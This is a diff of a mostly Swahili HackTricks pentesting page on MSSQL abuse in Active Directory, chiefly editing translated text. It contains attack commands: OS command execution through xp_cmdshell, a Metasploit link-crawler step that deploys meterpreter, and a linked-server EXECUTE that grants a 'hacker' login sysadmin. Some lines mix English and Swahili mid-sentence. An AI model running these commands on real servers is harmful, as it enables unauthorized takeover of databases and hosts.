@@ -1,16 +1,16 @@
 # MSSQL AD Abuse
 
 {% hint style="success" %}
-Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
@@ -22,7 +22,7 @@ Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" al
 ## **MSSQL Enumeration / Discovery**
 
 ### Python
-Zana ya [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) inategemea impacket, na pia inaruhusu kuthibitisha kwa kutumia tiketi za kerberos, na kushambulia kupitia minyororo ya viungo.
+Chombo cha [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) kinategemea impacket, na pia kinaruhusu kuthibitisha kwa kutumia tiketi za kerberos, na kushambulia kupitia minyororo ya viungo.
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -140,26 +140,26 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-Inaweza pia kuwa na uwezekano wa **kutekeleza amri** ndani ya mwenyeji wa MSSQL
+Inaweza pia kuwa inawezekana **kutekeleza amri** ndani ya mwenyeji wa MSSQL
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Check in the page mentioned in the **following section how to do this manually.**
+Check in the page mentioned in the **sehemu ifuatayo jinsi ya kufanya hivi kwa mikono.**
 
-### MSSQL Basic Hacking Tricks
+### MSSQL Njia za Msingi za Hacking
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
 {% endcontent-ref %}
 
-## MSSQL Trusted Links
+## MSSQL Viungo Vilivyokubaliwa
 
-Ikiwa mfano wa MSSQL unakubaliwa (kiungo cha database) na mfano mwingine wa MSSQL. Ikiwa mtumiaji ana mamlaka juu ya database iliyoaminika, ataweza **kutumia uhusiano wa kuaminiana kutekeleza maswali pia katika mfano mwingine**. Hizi zinazoaminika zinaweza kuunganishwa na wakati fulani mtumiaji anaweza kupata database iliyo na mipangilio isiyo sahihi ambapo anaweza kutekeleza amri.
+Ikiwa mfano wa MSSQL unakubaliwa (kiungo cha database) na mfano mwingine wa MSSQL. Ikiwa mtumiaji ana mamlaka juu ya database iliyo na uaminifu, ataweza **kutumia uhusiano wa uaminifu kutekeleza maswali pia katika mfano mwingine**. Hii inaruhusiwa kuunganishwa na kwa wakati fulani mtumiaji anaweza kupata database iliyo na mipangilio isiyo sahihi ambapo anaweza kutekeleza amri.
 
-**Viungo kati ya databases vinafanya kazi hata katika uaminifu wa msitu.**
+**Viungo kati ya databases vinafanya kazi hata kupitia uaminifu wa msitu.**
 
-### Powershell Abuse
+### Abuse ya Powershell
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -193,19 +193,19 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Unaweza kuangalia kwa urahisi viungo vinavyotegemewa kwa kutumia metasploit.
+Unaweza kwa urahisi kuangalia viungo vinavyotegemewa kwa kutumia metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Kumbuka kwamba metasploit itajaribu kutumia tu kazi ya `openquery()` katika MSSQL (hivyo, ikiwa huwezi kutekeleza amri na `openquery()`, utahitaji kujaribu njia ya `EXECUTE` **kwa mikono** kutekeleza amri, angalia zaidi hapa chini.)
+Kumbuka kwamba metasploit itajaribu kutumia tu kazi ya `openquery()` katika MSSQL (hivyo, ikiwa huwezi kutekeleza amri na `openquery()` utahitaji kujaribu njia ya `EXECUTE` **kwa mikono** kutekeleza amri, angalia zaidi hapa chini.)
 
 ### Manual - Openquery()
 
 Kutoka **Linux** unaweza kupata shell ya MSSQL console kwa kutumia **sqsh** na **mssqlclient.py.**
 
-Kutoka **Windows** pia unaweza kupata viungo na kutekeleza amri kwa mikono ukitumia **MSSQL client kama** [**HeidiSQL**](https://www.heidisql.com)
+Kutoka **Windows** unaweza pia kupata viungo na kutekeleza amri kwa mikono ukitumia **MSSQL client kama** [**HeidiSQL**](https://www.heidisql.com)
 
 _Ingia kwa kutumia uthibitisho wa Windows:_
 
@@ -250,7 +250,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## Local Privilege Escalation
 
-Mtumiaji wa **MSSQL wa ndani** kwa kawaida ana aina maalum ya ruhusa inayoitwa **`SeImpersonatePrivilege`**. Hii inaruhusu akaunti "kujifanya mteja baada ya uthibitisho".
+Mtumiaji wa **MSSQL** wa ndani kwa kawaida ana aina maalum ya ruhusa inayoitwa **`SeImpersonatePrivilege`**. Hii inaruhusu akaunti "kujifanya mteja baada ya uthibitisho".
 
 Mkakati ambao waandishi wengi wamekuja nao ni kulazimisha huduma ya SYSTEM kuthibitisha kwa huduma ya uasi au mtu katikati ambayo mshambuliaji anaunda. Huduma hii ya uasi inaweza kujifanya kama huduma ya SYSTEM wakati inajaribu kuthibitisha.
 
